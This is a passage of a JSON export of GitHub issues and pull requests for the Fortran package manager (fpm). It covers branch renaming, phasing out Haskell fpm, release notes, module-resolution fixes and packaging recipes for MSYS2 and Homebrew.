                    "date": "2021-04-04 06:35:47+00:00",
                    "text": "@milancurcic the workflow you outlined is what I've done on other repositories where I've made this change."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-08 16:03:32+00:00",
                    "text": "For the transition, instead of renaming \"master\" -> \"main\" in the settings, do you think this flow would work:\n\nCreate a branch \"main\" from \"master\"\nDo necessary PRs for docs and CI to work with \"main\"\nChange default branch in settings from \"master\" to \"main\"\nDelete \"master\" branch.\n\n\nIt seems that GitHub is offering a somewhat more seamless way of renaming branches, which will automatically create a redirect from \"master\" to the new branch name. This only leaves step 2 as a follow-up to the renaming, everything else will be automatic.\nI'm happy to start with doing the necessary changes for fpm and we can evaluate how this strategy works out in practice before taking on the other repositories."
                },
                {
                    "user": "jvdp1",
                    "date": "2021-09-08 16:17:09+00:00",
                    "text": "fine for me!"
                },
                {
                    "user": "milancurcic",
                    "date": "2021-09-08 16:21:22+00:00",
                    "text": "@awvwgk Wonderful, I didn't know about it. Sounds like the way to go."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-08 16:26:12+00:00",
                    "text": "Just did the renaming, let me know if it works as expected."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-08 16:30:08+00:00",
                    "text": "Here is what I did to update my local git repository (I'm using github as identifier for this repo, upstream is my fork):\n\u276f git checkout master\nSwitched to branch 'master'\nYour branch is up to date with 'github/master'.\n\u276f git branch -m master main\n\u276f git fetch --all --prune\nFetching upstream\nFrom github.com:awvwgk/fortran-package-manager\n - [deleted]           (none)     -> upstream/master\n   (refs/remotes/upstream/HEAD has become dangling)\nremote: Enumerating objects: 16, done.\nremote: Counting objects: 100% (16/16), done.\nremote: Compressing objects: 100% (10/10), done.\nremote: Total 13 (delta 6), reused 7 (delta 3), pack-reused 0\nUnpacking objects: 100% (13/13), 3.37 KiB | 313.00 KiB/s, done.\n * [new branch]        main       -> upstream/main\nFetching github\nFrom github.com:fortran-lang/fpm\n - [deleted]           (none)     -> github/master\nremote: Enumerating objects: 690, done.\nremote: Counting objects: 100% (690/690), done.\nremote: Compressing objects: 100% (20/20), done.\nremote: Total 484 (delta 464), reused 482 (delta 462), pack-reused 0\nReceiving objects: 100% (484/484), 82.67 KiB | 1.02 MiB/s, done.\nResolving deltas: 100% (464/464), completed with 197 local objects.\n   86ec00b6..0a9d845e  gh-pages   -> github/gh-pages\n * [new branch]        main       -> github/main\n\u276f git branch --set-upstream-to github/main\nBranch 'main' set up to track remote branch 'main' from 'github'."
                }
            ]
        },
        {
            "number": 420,
            "user": "awvwgk",
            "date": "2021-03-31 10:01:36+00:00",
            "title": "Phase out Haskell fpm",
            "text": "remove bootstrap directory from repository\n remove stack-build from CI workflow\n move Fortran fpm to project root\n update README\n update install.sh script\n\nRelated fortran-lang/fpm-haskell#1\nCloses #253",
            "comments": []
        },
        {
            "number": 419,
            "user": "awvwgk",
            "date": "2021-03-30 17:53:24+00:00",
            "title": "Split workflow for Haskell and Fortran fpm",
            "text": "Creates separate workflows for Haskell and Fortran fpm. Haskell fpm is build with stack as usual, Fortran fpm is build with fpm 0.2.0, and than used to bootstrap itself in a two step procedure.\nNote, the Windows workflow is using git-bash instead of cmd or powershell, because I'm not a Windows user and not really familiar with cmd, powershell and bat-scripts.\nHere is a test release created with the new workflow: https://github.com/awvwgk/fortran-package-manager/releases/tag/v0.2.0",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-03-31 09:18:26+00:00",
                    "text": "Let's separate the pruning step and the CI splitting. I'll open another PR to remove all Haskell fpm related parts from this project. This PR is just shuffling things in the CI around to get the same outcome as before, just by different means."
                }
            ]
        },
        {
            "number": 418,
            "user": "awvwgk",
            "date": "2021-03-30 08:14:42+00:00",
            "title": "Bump fpm to version 0.2.0",
            "text": "Release notes:\n**Changes**\n- Add omp_lib to intrinsic modules list (https://github.com/fortran-lang/fpm/pull/413)\n- Give Programs Access to Code in subdirectories (https://github.com/fortran-lang/fpm/pull/409)\n\n**New Features**\n- Add explicit include-dir key to manifest (https://github.com/fortran-lang/fpm/pull/377)\n- Replace deprecated flags in debug_fortran option (https://github.com/fortran-lang/fpm/pull/386)\n- Implement --flag option for Fortran fpm (https://github.com/fortran-lang/fpm/pull/390, https://github.com/fortran-lang/fpm/pull/407)\n\n**Fixes**\n- Minor fix: for setting executable link libraries (https://github.com/fortran-lang/fpm/pull/398)\n- Correct join for null input (https://github.com/fortran-lang/fpm/pull/404)",
            "comments": []
        },
        {
            "number": 417,
            "user": "LKedward",
            "date": "2021-03-30 08:11:15+00:00",
            "title": "Bump version for new release",
            "text": "PR to bump version to 0.2.0.\nI'll create the new release on github once merged. See below for proposed change log entry, feel free to edit.\n\nChanges:\n\n\nReplace deprecated flags in gfortran debug profile (#386)\n\n\n--release flag is replaced by --profile release (#390)\n\n\nPrograms can use modules defined in relative subdirectories (#409)\n\n\nNew features:\n\n\nAdd support for specifying an include directory (#377)\n\n\nImplement --flag command line option (#390)\n\n\nFixes:\n\n\nFix problems when building with local paths (#327,#390)\n\n\nFix for executable link libraries when auto discovery is enabled (#398)\n\n\nFix fpm_strings::join for null inputs (#404)",
            "comments": []
        },
        {
            "number": 416,
            "user": "rouson",
            "date": "2021-03-29 21:55:25+00:00",
            "title": "Establishing a release schedule",
            "text": "Assuming the default branch is always releasable, i.e., has no regressions, would it make sense to establish a regular release schedule?   Are the most time-consuming aspects of the release process automated so that this request is not burdensome?  If so, then I would recommend releasing every 2-3 weeks.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-03-30 21:04:02+00:00",
                    "text": "I'm actually quite happy with the current flexible release strategy. At the current pace we get enough features / fixes together to roll out a release every month, which is nice since we are also making much progress with fpm. Still, I won't feel obliged to release for two months or longer if everybody here is busy elsewhere, it is still a volunteer project after all.\nThe easiest solution we can implement is a continuous release which always provides binaries from the latest head."
                }
            ]
        },
        {
            "number": 415,
            "user": "awvwgk",
            "date": "2021-03-28 17:45:01+00:00",
            "title": "Support setting of link arguments",
            "text": "Currently we only support --flag arguments to set compile arguments which are also added to the link line. The --flag argument could be used to add link arguments in the hope they will be silently ignored by the compiler when not linking, but we preferably provide a command-line option to add link arguments as well rather than relying on the compiler.\nSee https://github.com/PIK-ICoN/NetworkDynamicsBenchmarks#compile-fortran-program for such a misuse of the --flag option from Haskell fpm.\nA common usage of link arguments would would be the selection of a different sysroot in a conda-build setup.",
            "comments": []
        },
        {
            "number": 414,
            "user": "ChetanKarwa",
            "date": "2021-03-26 20:48:03+00:00",
            "title": "Add few important links",
            "text": "I have addressed some of the feedbacks which were acknowledged by the reviewers in this PR.\n\nSuggestion from Laurence\nSuggestion from Sebastian\nSuggestion from Jon",
            "comments": [
                {
                    "user": "ChetanKarwa",
                    "date": "2021-03-27 17:42:23+00:00",
                    "text": "I have made the requested changes. It's good to go now."
                }
            ]
        },
        {
            "number": 413,
            "user": "LKedward",
            "date": "2021-03-25 15:58:36+00:00",
            "title": "Add: omp_lib to intrinsic modules list",
            "text": "",
            "comments": []
        },
        {
            "number": 412,
            "user": "kubajj",
            "date": "2021-03-24 22:47:35+00:00",
            "title": "Fix for Issue #396 - Duplicate module definitions",
            "text": "Create a new subroutine called right at the end of the build model subroutine. This subroutine loops through modules provided by each source file and checks for duplicates.",
            "comments": [
                {
                    "user": "kubajj",
                    "date": "2021-03-26 22:56:45+00:00",
                    "text": "During the monthly call, you were talking about rebasing and squashing. Should I do it?"
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-03-27 12:04:16+00:00",
                    "text": "Should this PR include a test case with definition of duplicate modules? @LKedward"
                },
                {
                    "user": "LKedward",
                    "date": "2021-03-27 15:49:52+00:00",
                    "text": "Looking good so far @kubajj! I don't think there's any pressing need to rebase this branch currently.\n\nShould this PR include a test case with definition of duplicate modules? @LKedward\n\nAgreed yes we should put some unit tests in for this.\n@kubajj do you want to have a look at test_module_dependencies.f90; this testsuite provides some helpers to mock up package sources very easily and it should be quite straightforward to add a few new tests for this duplicates check. Try to test the various possible scenarios (duplicates in same package, in different packages, in different source types, in same file, no duplicates etc.). Let me know if you need some more explanation of the testsuite. Otherwise I'm happy to also just commit some tests straight to your branch."
                },
                {
                    "user": "kubajj",
                    "date": "2021-03-30 11:18:12+00:00",
                    "text": "Looking good so far @kubajj! I don't think there's any pressing need to rebase this branch currently.\n\nShould this PR include a test case with definition of duplicate modules? @LKedward\n\nAgreed yes we should put some unit tests in for this.\n@kubajj do you want to have a look at test_module_dependencies.f90; this testsuite provides some helpers to mock up package sources very easily and it should be quite straightforward to add a few new tests for this duplicates check. Try to test the various possible scenarios (duplicates in same package, in different packages, in different source types, in same file, no duplicates etc.). Let me know if you need some more explanation of the testsuite. Otherwise I'm happy to also just commit some tests straight to your branch.\n\n@LKedward  For creating the different scenarios, should I add source files that would have duplicate modules and load them as in subroutine test_library_module_use or is there another way how to do it?"
                },
                {
                    "user": "LKedward",
                    "date": "2021-03-30 11:32:17+00:00",
                    "text": "No need to write actual fortran source files for these tests, just like the other tests in test_module_dependencies.f90 you can use the new_test_source helper to create a source object with certain modules.\nHere's an example unit test to use:\n    subroutine test_package_module_duplicates(error)\n        \n        type(error_t), allocatable, intent(out) :: error\n\n        type(fpm_model_t) :: model\n        logical :: duplicates_found\n\n        allocate(model%packages(1))\n        allocate(model%packages(1)%sources(2))\n\n        model%packages(1)%sources(1) = new_test_source(FPM_UNIT_MODULE,file_name=\"src/my_mod_1.f90\", &\n                                    scope = FPM_SCOPE_LIB, provides=[string_t('my_mod_1')])\n\n        model%packages(1)%sources(2) = new_test_source(FPM_UNIT_MODULE,file_name=\"src/subdir/my_mod_1.f90\", &\n                                    scope = FPM_SCOPE_LIB, provides=[string_t('my_mod_1')])\n\n        call check_modules_for_duplicates(model, duplicates_found)\n        if (duplicates_found) then\n            call test_failed(error,'Duplicate modules found')\n            return\n        end if\n    end subroutine test_package_module_duplicates\n(The filename here doesn't matter, the file doesn't need to exist, it is used for other tests.)\nThen you just need to add test_package_module_duplicates to the collect routine at the top with should_fail=.true.."
                },
                {
                    "user": "kubajj",
                    "date": "2021-03-30 19:00:37+00:00",
                    "text": "@LKedward  Oh, this is brilliant. What did you mean by different source types in the list of possible scenarios?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-03-31 09:47:10+00:00",
                    "text": "I'll go ahead and merge before we start pruning the Haskell version from this repository."
                }
            ]
        },
        {
            "number": 411,
            "user": "milancurcic",
            "date": "2021-03-24 16:38:29+00:00",
            "title": "Allow running fpm from out-of-package directory",
            "text": "In other words, allow specifying a package directory to build, install, test, and run commands.\nCargo has cargo build --manifest-path=dir/Cargo.toml.\nThis would be useful in automating fpm batch jobs. For example, in combination with #410, this\nfpm run --manifest-path=/path/to/my/fpm/package/fpm.toml --directory=/path/to/my/run/dir\n\nwould run an executable from a package in /path/to/my/fpm/package in a directory /path/to/my/run/dir.",
            "comments": []
        },
        {
            "number": 410,
            "user": "LKedward",
            "date": "2021-03-24 12:08:52+00:00",
            "title": "Add --directory flag for run and test",
            "text": "A useful addition would be a --directory flag to specify a directory to change to before running an executable.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2021-03-24 16:31:41+00:00",
                    "text": "This will be important for applications that expect input files to be present, as well as output files, in the current directory."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-26 08:59:58+00:00",
                    "text": "Since we now support -C/--directory to change the working directory of fpm. In principle we can change the working directory for the fpm run command. Still, fpm requires the package manifest to be placed in the current working directory, this must be made more flexible for this option to actually to become useful.\nOn the other hand, we have the automatic discovery of the package manifest in place, fpm is able to locate the manifest file in the parent directory. Our mechanism to make fpm work correctly in this scenario is to change to the project root directory... which takes away any potential advantages of using the -C/--directory option at the moment.\nInstead we should retain both the working directory and the automatic detected project root and use those to correctly setup all file paths relative to our initial/final working directory (depending whether we actually change the working directory in the run). The main difficulty is to identify all relative file paths which must be aware of the difference between working directory and project root directory.\nOne solution is to have a file system context, which can be used to access all file paths and is able to automatically convert paths relative to the project root to paths relative to the current working directory."
                }
            ]
        },
        {
            "number": 409,
            "user": "everythingfunctional",
            "date": "2021-03-23 19:48:21+00:00",
            "title": "Give Programs Access to Code in Subdirectories",
            "text": "Programs can now use modules in subdirectories from their location. I.e. a program app/main.f90 can use a module app/sub_dir/mod.f90. This applies to tests and examples as well.\nFix #408",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2021-03-23 19:49:47+00:00",
                    "text": "Sorry about the noisy change set. My editor is set to automatically remove trailing whitespace."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-03-24 12:07:56+00:00",
                    "text": "I've added the test and updated the doc string as suggested. Thanks for the great reviews guys. I'll give you guys a few hours in case you want to double check the changes and merge later today."
                }
            ]
        },
        {
            "number": 408,
            "user": "everythingfunctional",
            "date": "2021-03-23 14:52:16+00:00",
            "title": "Cannot Find Modules in Subdirectories of Tests or Executables",
            "text": "If there are modules in sub-directories of a test or executable, fpm reports that it cannot find them.\n[pop-os:~/tmp/test_subdirectories] tree\n.\n\u251c\u2500\u2500 app\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 main.f90\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 sub\n\u2502\u00a0\u00a0     \u2514\u2500\u2500 file.f90\n\u251c\u2500\u2500 fpm.toml\n\u251c\u2500\u2500 README.md\n\u251c\u2500\u2500 src\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 test_subdirectories.f90\n\u2514\u2500\u2500 test\n    \u251c\u2500\u2500 check.f90\n    \u2514\u2500\u2500 sub\n        \u2514\u2500\u2500 something.f90\n\n5 directories, 7 files\n[pop-os:~/tmp/test_subdirectories] fpm run\n + mkdir -p build/dependencies\nUnable to find source for module dependency: \"thing_m\" used by \"app/main.f90\"\nERROR STOP 1\n\nError termination. Backtrace:\n#0  0x47eb9d in ???\n#1  0x47ee35 in ???\n#2  0x47fdde in ???\n#3  0x406276 in __fpm_MOD_cmd_run\n\tat src/fpm.f90:226\n#4  0x400890 in MAIN__\n\tat app/main.f90:28\n#5  0x400890 in main\n\tat app/main.f90:9\n[pop-os:~/tmp/test_subdirectories] fpm test\nUnable to find source for module dependency: \"thing_m\" used by \"app/main.f90\"\nERROR STOP 1\n\nError termination. Backtrace:\n#0  0x47eb9d in ???\n#1  0x47ee35 in ???\n#2  0x47fdde in ???\n#3  0x406276 in __fpm_MOD_cmd_run\n\tat src/fpm.f90:226\n#4  0x400861 in MAIN__\n\tat app/main.f90:30\n#5  0x400861 in main\n\tat app/main.f90:9\n\nI was under the impression that this was meant to work.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-03-23 15:20:45+00:00",
                    "text": "This restriction was put in with #190, that executables can only use non-library modules in the same directory as the executable source file. I need to search for the relevant discussion for the reasoning behind this."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-03-23 16:03:38+00:00",
                    "text": "#164 (comment) is the relevant comment here."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-03-23 17:33:58+00:00",
                    "text": "I thought I recalled a discussion like that. I am on board with having multiple executables being automatically detected in the same folder (and rereading the discussion it seems I was accepting at the time). I do not recall why we wanted to disallow the programs from using modules in subdirectories, and do not see in the discussion something that would support that decision.\nBased on the current implementation of the model, how sources are found and parsed, etc., I don't see a reason we can't allow it. I think it's a somewhat surprising restriction, given I was even involved in the original conversation and didn't remember it was in place. I think it's a likely (if not common) use case.  I certainly have some projects that would benefit from that capability.\nI'll be happy to do the fix. Are there any objections to it?"
                },
                {
                    "user": "milancurcic",
                    "date": "2021-03-23 17:53:40+00:00",
                    "text": "As of now, I don't see why not. It would be an implicit rule, and an fpm user may never need to learn about it if they don't want to."
                },
                {
                    "user": "LKedward",
                    "date": "2021-03-23 18:47:48+00:00",
                    "text": "Yes, please go ahead with the changes Brad. I believe the choice was made based on the original stricter rules in Haskell fpm, but I agree now that it's an unnecessary restriction.\nTo be clear, will you be allowing access to just modules in relative sub-directories or access to all 'non-library' modules so to speak? My preference would probably be for the latter in terms of simplicity from the user point of view."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-03-23 18:56:09+00:00",
                    "text": "I would say that a program should have access to all modules:\n\nin the library\nin the same directory\nin subdirectories\n\nbut not in other directories. I.e. a program app/prog1/main.f90 would not have access to a module app/prog2/mod2.f90.\nI will note that my (naive) assumption that running add_sources_from_dir with recurse=.true. from add_executable_sources would be all that is required does not seem to do it. Would you be able to point me at what else needs to change?"
                },
                {
                    "user": "LKedward",
                    "date": "2021-03-23 19:16:19+00:00",
                    "text": "Okay yeah that sounds good.\nThe sources should already be in the model; you just need to modify the rule for resolving module dependencies.\nEdit: see resolve_module_dependencies"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-03-23 19:23:47+00:00",
                    "text": "Thanks. Will submit a PR once I've got it all worked out."
                }
            ]
        },
        {
            "number": 407,
            "user": "awvwgk",
            "date": "2021-03-22 12:39:16+00:00",
            "title": "Fix typo in fpm-build synopsis",
            "text": "Closes #406",
            "comments": []
        },
        {
            "number": 406,
            "user": "urbanjost",
            "date": "2021-03-22 12:32:18+00:00",
            "title": "errata in -flag help text",
            "text": "Errata in the help text.  The help for build after PR #390  has --flags instead of --flag.",
            "comments": []
        },
        {
            "number": 405,
            "user": "urbanjost",
            "date": "2021-03-22 00:43:50+00:00",
            "title": "fpm(1) should produce a message not stop when it cannot find the source for a module",
            "text": "fpm should produce a warning or an informative message not an error when it\ncannot find the source for a module. If I want to use OpenMP with gfortran\nand enter\nfpm build --flag -fopenmp\nUnable to find source for module dependency: \"omp_lib\" used by \"app/main.f90\"\nERROR STOP 1\nwhen using the -fopenmp switch with gfortran I should be able to use the OMP_LIB\nmodule. The same thing happens if I want to use system-installed modules that I\ncan point to via environment variables or -I,-l,-L, ...\nSo something as simple as this cannot be compiled ...\nprogram matrix1\n    use omp_lib\n    implicit none\n    integer :: n, nthreads\n    real(kind=8), allocatable, dimension(:,:) :: a,b,c\n    integer :: i,j,k\n\n    ! Specify number of threads to use:\n    !$ print *, \"Using OpenMP, how many threads? \"\n    !$ read *, nthreads \n    !$ call omp_set_num_threads(nthreads)\n      :\n      :\n      :",
            "comments": [
                {
                    "user": "jacobwilliams",
                    "date": "2021-03-27 17:41:05+00:00",
                    "text": "Yep, same thing happens with the built-in intel modules (ifport, ifcore, etc.)"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-03-27 20:41:51+00:00",
                    "text": "One could guard the import of the omp_lib with\n!$ use omp_lib\n\nto mitigate the issue.\n\nThere are plenty of other external Fortran modules, which won't enter the fpm ecosystem any time soon, we should look for a more general mechanism to allow declaring external modules in the package manifest. Maybe similar to build.link a build.use or build.module entry could declare external modules required by the project. Those cannot be provided by the project or its depednencies and must be provided externally."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-03-27 22:50:06+00:00",
                    "text": "Yes. Forgot to mention that is with I did with omp_lib is prefixed it with !$. That works fine.  I also think it would be good to be able to specify external modules but I still think it should only be a warning and that actually listing it would remove the warning.  I have not looked but thought that might be straight-forward.  Is there a down-side to making it a warning that outweighs the issues that it causes by being present?  Modules are becoming more commonly used for everything from MPI to OpenMP to vendor compiler extensions to locally developed interfaces and it would be hard for anything but the compiler and loader to determine if they are actually available or not.  If they were even ignored silently except by the compiler/loader I think I would prefer that."
                },
                {
                    "user": "LKedward",
                    "date": "2021-03-28 11:25:52+00:00",
                    "text": "To answer your question, there is no fundamental reason why we can't make it a warning instead, but I also like Sebastian's example for a manifest syntax which is more what I had in mind for using external modules while it is still necessary.\nIMO Fortran developers need to move away from trying to install system-wide module libraries, since it simply isn't supported in a general way (see #71,#257&fortranwiki) and this is a problem that fpm solves directly. In the short term and in the first instance we can quite easily develop fpm packages that provide module interfaces to such system-installed libraries instead of relying on .mod files."
                }
            ]
        },
        {
            "number": 404,
            "user": "urbanjost",
            "date": "2021-03-21 15:27:01+00:00",
            "title": "correct join for null input",
            "text": "If the input string is null join would overindex by using element\none when adding the left and right strings. This corrects that.\ncloses PR #403",
            "comments": []
        },
        {
            "number": 403,
            "user": "urbanjost",
            "date": "2021-03-21 04:59:10+00:00",
            "title": "join(3f) can overindex when the input string is null",
            "text": "was testing PR #390 and #362 with an execution timing script\n#!/bin/bash -f\n#@(#) fpm-time: timing report of tests using gprof. See gprof(1).\n# Way too many assumptions to count. Default is to run test/ programs.\nexport SUBCOMMAND=${1:-test}\nshift\nexport WHICH=${*:-'*'}\nexport GPROF='gprof --demangle --flat-profile' # --brief\n( exec 2>&1\nOPTS='-O0 -pg -fPIC -fcoarray=single'\n# build and run the specified programs with profiling turned on\nfpm $SUBCOMMAND $WHICH --compiler gfortran --flag \"$OPTS\"\n# run gprof with each program name\nfpm $SUBCOMMAND $WHICH --compiler gfortran --flag \"$OPTS\" --runner \"$GPROF\"\n)| tee timing.out\nexit\nWhere using the proposed features you can just enter\nfpm time run --example demo1\nand get a timing profile; and found that when the input string passed to join(3f) is null it will overindex the zero-size array by trying to use element 1.  Will add a PR shortly.",
            "comments": []
        },
        {
            "number": 402,
            "user": "milancurcic",
            "date": "2021-03-19 15:03:52+00:00",
            "title": "Add fpm description and reorganize the README intro",
            "text": "Sometimes we miss the most fundamental and seemingly obvious thing. Current README does not describe what fpm is or does.\nI added one paragraph description to the top of the README, and re-organized a bit what was there previously so that it reads a bit better (IMO).",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2021-03-19 15:38:27+00:00",
                    "text": "Yes, I think it should close #382."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-03-19 15:50:52+00:00",
                    "text": "Looks good.  Perhaps the phrase \"existing packages\" should link to the fpm repository."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-03-21 14:00:59+00:00",
                    "text": "With five out of five approvals I'll go ahead and merge."
                }
            ]
        },
        {
            "number": 401,
            "user": "awvwgk",
            "date": "2021-03-18 22:08:12+00:00",
            "title": "Packaging: submit fpm to MSYS2?",
            "text": "As an Arch Linux user I'm a huge fan of the MSYS2 packaging ecosystem for Windows and use it a lot in my GitHub actions workflows. Unfortunately, the setup-fpm and setup-msys2 action don't play well together and I usually skip the Windows testing part on fpm projects for this reason (see fortran-lang/setup-fpm#4). The easiest solution actually might be to submit a PKGBUILD to the MSYS2 repository here.\nI worked out a simple PKGBUILD file for fpm following the packaging guidelines at https://www.msys2.org/wiki/Creating-Packages/.\n_realname=fpm\npkgbase=mingw-w64-${_realname}\npkgname=\"${MINGW_PACKAGE_PREFIX}-${_realname}\"\npkgver=0.1.4\npkgrel=1\narch=('any')\npkgdesc=\"Fortran package manager (mingw-w64)\"\nurl=\"https://github.com/fortran-lang/fpm\"\ndepends=(\"${MINGW_PACKAGE_PREFIX}-gcc-libs\" \"${MINGW_PACKAGE_PREFIX}-gcc-libgfortran\")\nmakedepends=(\"${MINGW_PACKAGE_PREFIX}-gcc-fortran\")\noptions=('strip')\nlicense=('MIT')\nsource=(${_realname}-${pkgver}.f90::\"https://github.com/fortran-lang/fpm/releases/download/v${pkgver}/${_realname}-${pkgver}.f90\")\nsha256sums=('06c139b16cf871e06cd3ea3be93c1ddbb5a94e4546a0c64822d10dc87333ac0c')\nnoextract=(\"${_realname}-${pkgver}.f90\")\n\nbuild() {\n  cd \"${srcdir}\"\n  local _build=\"build_${CARCH}\"\n  local _fc=\"${MINGW_PREFIX}/bin/gfortran\"\n  # Compiler flags need some tweaking\n  local _fflags=\"-J ${_build}\"\n\n  mkdir -p \"${_build}\"\n  ${_fc} ${_fflags} \"fpm-${pkgver}.f90\" -o \"${_build}/fpm\"\n}\n\npackage() {\n  cd \"${srcdir}/build_${CARCH}\"\n  install -Dm755 fpm \"${pkgdir}\"${MINGW_PREFIX}/bin/fpm\n}\nWhat do you think, should we submit fpm to the MSYS2 project? How is the adoption of MSYS2 generally under the Windows based developers here?",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-03-19 08:36:38+00:00",
                    "text": "+1 for an MSYS2 package! Not an Arch user (yet) but I'm also a fan of the MSYS2 system. When I need to work on Windows, it's my go-to choice; it's got gcc-10, lot's of packages and I rarely run into difficulties compiling other software with it. Moreover I can distribute Windows binaries compiled in it to non-technical users. I'm not sure how many others use it since it seems most people are happy with WSL.\nI haven't done much testing with fpm in MSYS2 since I recall some subtleties regarding filesystem access and the OS detection needs some attention (#242)."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-04-15 17:25:39+00:00",
                    "text": "I have started a repository to package fpm myself for the MSYS2 toolchain here.\nThis was tested extensively today by several students installing fpm for the first time on their Windows machines and we didn't saw much problems with this approach."
                },
                {
                    "user": "LKedward",
                    "date": "2021-04-15 17:49:14+00:00",
                    "text": "Great to hear!\n\n... I recall some subtleties regarding filesystem access and the OS detection ...\n\nI recently pinpointed a minor issue with fpm on MSYS2 to be aware of which is that the wrong invocation for mkdir occurs in fpm_filesystem::mkdir because fpm detects generic 'Windows' but in MSYS2, mkdir is actually c:\\msys64\\usr\\bin\\mkdir.exe. This is the cause of any problems you've likely had when using parallel compilation. Fixing this contingent on proper runtime OS detection on Windows (#242)."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-03 20:09:14+00:00",
                    "text": "This is now available in the MinGW repository of the MSYS2 toolchain."
                },
                {
                    "user": "zoziha",
                    "date": "2021-09-03 20:52:55+00:00",
                    "text": "It looks really cool, I have been using MSYS for a long time.\nI tried to install fpm, and found that msys2's fpm seems to depend on a lot of other packages that have not been involved? The size has reached 90MB?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-03 20:58:17+00:00",
                    "text": "Maybe this is only an issue for the ucrt64 toolchain (marked as experimental in MSYS2)? How about using the standard mingw64 toolchain instead? I'm only depending on libgcc, libgfortran and git with the fpm package."
                },
                {
                    "user": "zoziha",
                    "date": "2021-09-03 21:08:00+00:00",
                    "text": "Because my computer has recently changed the system, there is no mingw64 environment configured. If I enter pacman -S mingw64/mingw-w64-x86_64-fpm, it seems that other dependencies besides gfortran, libgcc, git are also introduced (perl?). This illustration may not be rigorous, but you can try your computer."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-03 21:12:24+00:00",
                    "text": "Checkout the git package, it depends on the perl packages you are seeing. Since git is an essential runtime dependency of fpm it will always be installed with any fpm variant."
                },
                {
                    "user": "zoziha",
                    "date": "2021-09-03 21:20:57+00:00",
                    "text": "Thanks, it is indeed the case. It is my misunderstanding.\n\nI have been using this version of git under windows because my vs code graphical interface does not support msys2-git well."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-03 22:58:53+00:00",
                    "text": "The fpm package could have only an optional dependency on git, since git is not required for the most basic functionality. Of course we than need to provide an accurate error message from fpm in case we can't use git."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-10-06 20:12:14+00:00",
                    "text": "I opened msys2/MINGW-packages#9727 to make git an optional dependency for fpm in the MSYS2 package."
                }
            ]
        },
        {
            "number": 400,
            "user": "awvwgk",
            "date": "2021-03-18 21:58:23+00:00",
            "title": "Packaging: submit fpm to homebrew?",
            "text": "What do you think, should we submit fpm to homebrew? This could to mitigate #356.\nHere is a working formula I created on Linuxbrew for testing:\nclass Fpm < Formula\n  desc \"Fortran Package Manager (fpm)\"\n  homepage \"https://fpm.fortran-lang.org\"\n  url \"https://github.com/fortran-lang/fpm/releases/download/v0.1.4/fpm-0.1.4.f90\"\n  sha256 \"06c139b16cf871e06cd3ea3be93c1ddbb5a94e4546a0c64822d10dc87333ac0c\"\n  license \"MIT\"\n\n  depends_on \"gcc\" # for gfortran\n  fails_with :gcc => \"4\"\n  fails_with :gcc => \"5\"\n  fails_with :gcc => \"6\"\n  fails_with :clang\n\n  def install\n    # ENV.fc is not defined and setting it up with ENV.fortran will yield default gfortran\n    ENV[\"FC\"] = ENV.cc.gsub /gcc/, \"gfortran\"\n    # Compile arguments need some tweaking\n    system ENV[\"FC\"], \"fpm-0.1.4.f90\", \"-o\", \"fpm\"\n    bin.install \"fpm\"\n  end\n\n  test do\n    system \"#{bin}/fpm\", \"--version\"\n  end\nend\nSince I'm not a strong Linuxbrew user I won't have much use for fpm support in brew.\nDocumentation on submitting formulas to brew: https://docs.brew.sh/Formula-Cookbook",
            "comments": [
                {
                    "user": "ivan-pi",
                    "date": "2021-03-18 22:51:33+00:00",
                    "text": "I once tried using Linuxbrew but quickly reverted back to old habits. But I'm pretty sure that Homebrew is the best way to reach folks interested in scientific computing including Fortran on MacOS.\nI know @zbeekman has made some contributions to Homebrew before."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-06-24 09:59:10+00:00",
                    "text": "I'm currently maintaining a homebrew tap for fpm at https://github.com/awvwgk/homebrew-fpm, if there is interest this could be migrated to the @fortran-lang namespace (maybe as homebrew-fortran repo?).\ncc @certik @milancurcic @LKedward"
                },
                {
                    "user": "certik",
                    "date": "2021-06-24 14:26:02+00:00",
                    "text": "Last time I tried Homebrew, it installs things into /usr/local, which (I think) requires root, doesn't it? Either way, I don't think anything should write into /usr, neither on Linux, nor on macOS. The other problem with Homebrew is that it is macOS specific. For both of these reasons, I don't use it, and just use Conda on Linux, macOS and Windows. And I use fpm from there.\nThat being said, I think it's a good idea to submit to Homebrew and if @zbeekman would be willing to help, it should help expand our user base."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-06-24 15:09:51+00:00",
                    "text": "@certik It is quite a general question where we want to package fpm. I think generally we want to be in as many repositories as feasible. Meaning we have contributors that use the respective distribution and know how to package for it.\nAnother question is whether this is an effort we want to centralize or keep distributed in the community."
                },
                {
                    "user": "certik",
                    "date": "2021-06-24 17:09:36+00:00",
                    "text": "I agree, we should get fpm into as many package managers as possible.\nI would say we should try to get as involved as we can and our interests allow. Typically each package manager has its own way of accepting contributions, many are on GitHub, so we can just contribute as we see fit."
                },
                {
                    "user": "rouson",
